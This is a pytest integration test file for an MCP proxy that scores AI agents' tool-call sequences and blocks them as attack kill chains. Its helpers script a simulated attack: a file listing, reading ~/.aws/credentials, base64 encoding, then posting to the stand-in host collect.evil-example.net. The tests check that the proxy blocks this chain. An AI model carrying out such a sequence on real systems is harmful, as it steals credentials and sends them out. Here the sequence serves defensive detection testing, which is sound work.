"""Integration tests for the kill-chain wiring in proxy.py.

Covers the Phase 5 integration points from DESIGN.md: scorer
construction on ProxyServer (env and policy-YAML paths), the
per-call observe hook in _handle_tools_call, flag -> reputation
feeding, the block branch, and the result-side observe hook in
_screen_result.

Run: python3 -m pytest mcp_proxy/test_kill_chain_wiring.py -v

NOTE on schema_store: handler-level tests delete server.schema_store
to bypass the policy/schema region of _handle_tools_call, which in
this snapshot contains a known pre-existing UnboundLocalError (the
policy-block audit/return block reads `signed` outside the
policy-deny branch that assigns it; proxy.py ~line 545). That bug is
being fixed as a separate patch; the kill-chain hook sits downstream
of that region, so these tests exercise the flow as it runs once the
patch lands. Schema validation itself is guarded by the same
hasattr check, so removing the attribute is a supported shape.
"""

import os
import tempfile
import unittest
from unittest import mock

from mcp_proxy import proxy as proxy_mod
from mcp_proxy.config import ProxyConfig
from mcp_proxy.policy import PolicyEngine
from mcp_proxy.proxy import ProxyServer
from mcp_proxy.sequence_scoring import KillChainScorer, make_session_key

UPSTREAM = "http://upstream.test/mcp"
CLIENT = ("10.0.0.9", 5555)
EXTERNAL_URL = "https://collect.evil-example.net/drop"

BASE_ENV = {
    "MCP_PROXY_UPSTREAM": UPSTREAM,
    "MCP_PROXY_PORT": "0",
    "MCP_PROXY_SCREENING": "false",        # no TI network in tests
    "MCP_PROXY_RESULT_SCREENING": "true",
    "MCP_PROXY_BEHAVIOR": "false",         # isolate the kill-chain layer
    "MCP_PROXY_POLICY_FILE": "",
    "MCP_PROXY_KILL_CHAIN": "true",
    "MCP_PROXY_KILL_CHAIN_FLAG_SCORE": "",
    "MCP_PROXY_KILL_CHAIN_BLOCK_SCORE": "",
}


class _Forwarder:
    """Stand-in for proxy._forward_jsonrpc; counts forwarded calls."""

    def __init__(self, result=None):
        self.calls = []
        self.result = result or {"result": {"content": []}}

    def __call__(self, url, payload, timeout=30.0):
        self.calls.append(payload)
        return dict(self.result)


def _build_server(env_extra=None, policy_text=None):
    env = dict(BASE_ENV)
    if policy_text is not None:
        fd, path = tempfile.mkstemp(suffix=".yaml")
        with os.fdopen(fd, "w") as f:
            f.write(policy_text)
        env["MCP_PROXY_POLICY_FILE"] = path
    if env_extra:
        env.update(env_extra)
    with mock.patch.dict(os.environ, env):
        cfg = ProxyConfig()
        server = ProxyServer(cfg)
    return server


def _make_handler(server):
    handler = proxy_mod.ProxyHandler.__new__(proxy_mod.ProxyHandler)
    handler.server = server
    handler.client_address = CLIENT
    return handler


def _call(handler, server, name, arguments, req_id=1):
    req = {"jsonrpc": "2.0", "id": req_id, "method": "tools/call",
           "params": {"name": name, "arguments": arguments}}
    return handler._handle_tools_call(req, req_id, server.cfg,
                                      server.screener)


def _run_three_stages(handler, server):
    """recon + access + staging, all forwarded."""
    r1 = _call(handler, server, "list_files", {"path": "/data"}, 1)
    r2 = _call(handler, server, "read_file",
               {"path": "/home/u/.aws/credentials"}, 2)
    r3 = _call(handler, server, "base64_encode", {"data": "payload"}, 3)
    return r1, r2, r3


class TestConstruction(unittest.TestCase):

    def test_server_constructs_scorer_from_env(self):
        server = _build_server()
        try:
            self.assertIsInstance(server.kill_chain, KillChainScorer)
            self.assertTrue(server.kill_chain.enabled)
            # Defaults, untouched by env.
            self.assertEqual(server.kill_chain.config.flag_threshold, 40.0)
            self.assertEqual(server.kill_chain.config.block_threshold, 85.0)
        finally:
            server.server_close()

    def test_server_constructs_scorer_from_policy_yaml(self):
        server = _build_server(policy_text=(
            "sequence_scoring:\n"
            "  enabled: true\n"
            "  flag_threshold: 25\n"
            "  block_threshold: 70\n"
            "  block_stage: never\n"
        ))
        try:
            cfg = server.kill_chain.config
            self.assertEqual(cfg.flag_threshold, 25.0)
            self.assertEqual(cfg.block_threshold, 70.0)
            self.assertIsNone(cfg.block_stage)
        finally:
            server.server_close()

    def test_kill_chain_disabled_via_env(self):
        server = _build_server(env_extra={"MCP_PROXY_KILL_CHAIN": "false"})
        try:
            self.assertFalse(server.kill_chain.enabled)
            handler = _make_handler(server)
            del server.schema_store  # see module docstring
            forwarder = _Forwarder()
            with mock.patch.object(proxy_mod, "_forward_jsonrpc",
                                   forwarder):
                _run_three_stages(handler, server)
                r4 = _call(handler, server, "http_post",
                           {"url": EXTERNAL_URL, "data": "x"}, 4)
            # Nothing blocked, everything forwarded, no session state.
            self.assertNotIn("error", r4)
            self.assertEqual(len(forwarder.calls), 4)
            key = make_session_key(CLIENT[0], UPSTREAM)
            self.assertFalse(server.kill_chain.session_state(key)["known"])
        finally:
            server.server_close()


class TestPolicySection(unittest.TestCase):

    def test_section_retained_and_reloaded(self):
        with tempfile.TemporaryDirectory() as td:
            path = os.path.join(td, "policy.yaml")
            with open(path, "w") as f:
                f.write("agents: {}\nsequence_scoring:\n"
                        "  flag_threshold: 33\n")
            engine = PolicyEngine(path)
            self.assertEqual(engine.sequence_scoring_section(),
                             {"flag_threshold": 33})
            with open(path, "w") as f:
                f.write("agents: {}\nsequence_scoring:\n"
                        "  flag_threshold: 55\n  block_stage: never\n")
            self.assertTrue(engine.reload())
            self.assertEqual(engine.sequence_scoring_section(),
                             {"flag_threshold": 55,
                              "block_stage": "never"})

    def test_section_absent_is_empty_dict(self):
        engine = PolicyEngine("")
        self.assertEqual(engine.sequence_scoring_section(), {})


class TestCallPath(unittest.TestCase):

    def setUp(self):
        self.server = _build_server()
        # Bypass the snapshot's policy/schema region; see docstring.
        del self.server.schema_store
        self.handler = _make_handler(self.server)
        self.forwarder = _Forwarder()
        patcher = mock.patch.object(proxy_mod, "_forward_jsonrpc",
                                    self.forwarder)
        patcher.start()
        self.addCleanup(patcher.stop)
        self.addCleanup(self.server.server_close)

    def test_full_chain_blocks_at_exfil(self):
        r1, r2, r3 = _run_three_stages(self.handler, self.server)
        for resp in (r1, r2, r3):
            self.assertNotIn("error", resp)
        self.assertEqual(len(self.forwarder.calls), 3)

        # The access call crossed the flag threshold: reputation got
        # an attack-chain event for the upstream.
        record = self.server.reputation.get_or_create(UPSTREAM)
        self.assertGreaterEqual(record.event_counts["attack_chain"], 1)

        # Session is mid-chain at score 65 (15 + 30 + 20).
        key = make_session_key(CLIENT[0], UPSTREAM)
        state = self.server.kill_chain.session_state(key)
        self.assertEqual(state["stage"], "staging")
        self.assertGreaterEqual(state["score"], 60.0)

        # Fourth call completes the chain in order: blocked, not
        # forwarded, signed-verdict error shape like the TI block.
        r4 = _call(self.handler, self.server, "http_post",
                   {"url": EXTERNAL_URL, "data": "x"}, 4)
        self.assertEqual(len(self.forwarder.calls), 3)
        self.assertIn("error", r4)
        self.assertEqual(r4["error"]["code"],
                         proxy_mod.ERR_BLOCKED_BY_POLICY)
        self.assertEqual(r4["error"]["data"]["poison_category"],
                         "kill_chain")
        self.assertIn("verdict", r4["error"]["data"])

        # The block is in the audit trail under the kill_chain
        # category.
        entries = self.server.audit.export_json(50)
        self.assertTrue(any(
            e.get("decision") == "block"
            and e.get("poison_category") == "kill_chain"
            for e in entries))

    def test_benign_calls_never_block(self):
        for i in range(3):
            resp = _call(self.handler, self.server, "get_status",
                         {"verbose": True}, 10 + i)
            self.assertNotIn("error", resp)
        self.assertEqual(len(self.forwarder.calls), 3)
        key = make_session_key(CLIENT[0], UPSTREAM)
        state = self.server.kill_chain.session_state(key)
        self.assertEqual(state["score"], 0.0)

    def test_result_side_completion_holds_response(self):
        _run_three_stages(self.handler, self.server)
        self.forwarder.result = {
            "result": {"content": [{
                "type": "text",
                "text": f"mirror: {EXTERNAL_URL}/x",
            }]},
        }
        resp = _call(self.handler, self.server, "get_status", {}, 4)
        # Result-side semantics (revised 2026-10-23): a chain
        # completed by a result at block level HOLDS the response.
        # The call was forwarded (the result existed), but the
        # caller receives the kill-chain block error with the
        # signed verdict instead of the upstream response.
        self.assertEqual(len(self.forwarder.calls), 4)
        self.assertIn("error", resp)
        self.assertEqual(resp["error"]["code"],
                         proxy_mod.ERR_BLOCKED_BY_POLICY)
        self.assertEqual(resp["error"]["data"]["poison_category"],
                         "kill_chain")
        self.assertTrue(resp["error"]["data"]["held_result"])
        self.assertIn("verdict", resp["error"]["data"])
        key = make_session_key(CLIENT[0], UPSTREAM)
        state = self.server.kill_chain.session_state(key)
        self.assertGreaterEqual(state["score"], 85.0)
        self.assertEqual(state["chain"], 2)
        # The hold is audited as a block under kill_chain.
        entries = self.server.audit.export_json(50)
        self.assertTrue(any(
            e.get("decision") == "block"
            and e.get("poison_category") == "kill_chain"
            for e in entries))


if __name__ == "__main__":
    unittest.main()
